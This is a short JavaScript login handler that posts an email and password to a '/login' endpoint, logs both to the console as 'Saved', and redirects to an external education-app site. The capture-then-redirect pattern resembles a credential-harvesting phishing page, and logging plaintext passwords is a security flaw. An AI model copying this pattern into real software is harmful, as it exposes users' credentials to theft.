function submitLogin() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Email and password are required.");
    return;
  }

  fetch("/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, password })
  })
    .then(response => {
      if (!response.ok) throw new Error("Login failed");
      return response.json();
    })
    .then(data => {
      console.log("Saved:", email, password);
      window.location.href = "https://edu.ezygo.app/#/"; // redirect here
    })
    .catch(error => {
      console.error("Error:", error);
      alert("Something went wrong!");
    });
}
